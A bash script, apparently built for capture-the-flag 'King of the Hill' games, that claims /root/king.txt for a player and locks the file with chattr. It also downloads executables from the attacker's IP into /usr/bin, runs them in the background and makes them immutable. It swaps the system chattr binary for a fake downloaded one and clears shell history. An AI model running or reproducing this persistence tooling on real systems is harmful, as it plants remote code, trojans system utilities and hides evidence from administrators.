#!/bin/bash
# Created by @H3X-007 ;)

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
RESET='\033[0m'

echo
echo -e "${BLUE}Hi, I am The KOTH Script ... I have been created by H3X-007 to make sure you are the KING :) I'm kind :D${RESET}"
echo
echo -e "Join our Discord Server: ${YELLOW}https://discord.gg/y3aCGbrT8J${RESET}"
echo
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
read -p "Enter your nickname: " nick
read -p "What is your VPN IP?: " IP
echo -e "Hello ${GREEN}$nick${RESET} :) Let's go"
echo 
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo 
chmod +x /usr/bin/chattr
set write off
sudo chattr -ai /root/king.txt
echo "$nick" >> /root/king.txt
echo "$nick" | sudo tee /root/king.txt >/dev/null
sudo chattr +ai /root/king.txt
sudo chmod 400 /root/king.txt
set -o noclobber /root/king.txt
echo 
echo
echo "-----------------------------------------------------------------------------"
echo 
echo -e "${BLUE}Files Operation Complete... Starting Operation 2...${RESET}"
echo 
echo "-----------------------------------------------------------------------------"
echo
echo -e "${GREEN}Let's Go Forward... :)${RESET}"
echo
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo
cd /usr/bin && wget http://$IP/check && chmod +x check 
./check &
cd /usr/bin && wget http://$IP/guardian && chmod +x guardian 
./guardian &
chattr +ai /usr/bin/check && chattr +ai /usr/bin/guardian
echo
echo "--------------------File successfully running in the background---------------"
echo "-----------------------------------------------------------------------------"
echo
rm -rf /usr/bin/chattr && cd /usr/bin && wget http://$IP/chattr && chmod +x chattr
echo
echo "------------------Fake chattr successfully added-----------------"
echo "-----------------------------------------------------------------"
echo "$IP" > /etc/HOST &
echo "$nick" > /etc/nick &
history -c
echo
echo "-----------------------------------------------------------------------------"
echo "-----------------------------------------------------------------------------"
echo
echo -e "${GREEN}Operation Fully Complete. The KING is $nick! :)${RESET}"
echo
echo "--------------Hi $nick don't forget to give us a star on Github--------------"
echo "-----------------------------------------------------------------------------"
